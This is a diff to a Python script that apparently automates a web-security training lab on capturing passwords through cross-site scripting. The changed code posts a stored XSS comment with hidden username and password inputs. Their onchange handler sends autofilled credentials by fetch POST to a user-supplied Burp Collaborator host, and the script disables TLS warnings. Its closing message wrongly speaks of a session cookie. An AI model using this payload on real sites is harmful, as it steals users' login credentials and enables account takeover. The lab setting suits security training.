@@ -4,7 +4,7 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-LAB_NAME = "Stored XSS into HTML context with nothing encoded"
+LAB_NAME = "Exploiting cross-site scripting to capture passwords"
 
 def run(url, payload=None, proxies=None):
     session = requests.Session()
@@ -15,6 +15,8 @@ def run(url, payload=None, proxies=None):
         # Step 1: Fetch the blog post
         r = session.get(url.rstrip('/') + "/post?postId=1")
         csrf_token = re.search(r'name="csrf" value="(.+?)"', r.text).group(1)
+        user_input = input("[?] Enter the Burp Collaborator domain: ").strip()
+        string = f"'{user_input}'"
 
         # Step 2: Post comment with XSS payload
         data = {
@@ -22,11 +24,19 @@ def run(url, payload=None, proxies=None):
             "postId": "1",
             "name": "mystic_mido",
             "email": "mystic_mido@mystic_mido.com",
-            "website": "https://snehbavarva.com",
-            "comment": "<script>alert(1)</script>"
+            "comment": f"""<input name=username id=username>
+                <input name=password type=password
+                onchange="if(this.value.length){{fetch('https://{string}',{{
+                        method:'POST',
+                        mode: 'no-cors',
+                        body: username.value+':'+this.value
+                    }});
+                }}">"""
         }
 
         response = session.post(url.rstrip('/') + "/post/comment", data=data)
+        r = session.get(url.rstrip('/') + "/post?postId=1")
+        print("Check you burp collaborator for the victim's session cookie, then use this cookie to impersonate the victim or submit it")
         return "Congratulations, you solved the lab!" in response.text or response.status_code == 200
 
     except Exception as e:
